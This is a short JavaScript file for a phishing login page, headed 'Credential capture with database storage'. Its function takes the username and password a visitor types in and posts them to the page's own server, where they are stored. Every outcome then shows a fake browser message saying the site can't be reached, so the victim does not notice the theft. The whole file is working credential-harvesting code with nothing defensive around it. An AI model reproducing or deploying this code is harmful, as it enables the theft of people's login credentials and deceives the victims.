// Credential capture with database storage
function checkLogin() {
    console.log('=== Login button clicked ===');
    
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var errorElement = document.getElementById("error-message");
    var errorText = document.getElementById("error-text");

    console.log('Username:', username);
    console.log('Password:', password ? '***' : '(empty)');
    console.log('Error element found:', !!errorElement);
    console.log('Error text found:', !!errorText);

    // Validate inputs
    if (!username || !password) {
        console.log('Validation failed: missing username or password');
        if (errorElement && errorText) {
            errorText.innerHTML = 'Please enter both username and password.';
            errorElement.style.display = "flex";
        }
        return;
    }

    console.log('Sending to server...');

    // Get the API URL (works for both localhost and deployed version)
    const apiUrl = window.location.origin + '/api/login';
    console.log('API URL:', apiUrl);

    // Send credentials to server
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => {
        console.log('Server response status:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('Server response data:', data);
        if (data.success) {
            console.log('✅ Credentials saved to database!');
            // Show site not reached error message
            if (errorElement && errorText) {
                errorText.innerHTML = 'This site can\'t be reached. Check if there is a typo in the address or try reloading the page.';
                errorElement.style.display = "flex";
                console.log('Error message displayed');
            }
        } else {
            console.log('Server returned error');
            if (errorElement && errorText) {
                errorText.innerHTML = 'This site can\'t be reached. Please try again later.';
                errorElement.style.display = "flex";
            }
        }
    })
    .catch(error => {
        console.error('❌ Fetch error:', error);
        // Show site not reached error
        if (errorElement && errorText) {
            errorText.innerHTML = 'This site can\'t be reached. The connection was reset.';
            errorElement.style.display = "flex";
            console.log('Error message displayed (catch)');
        }
    });
}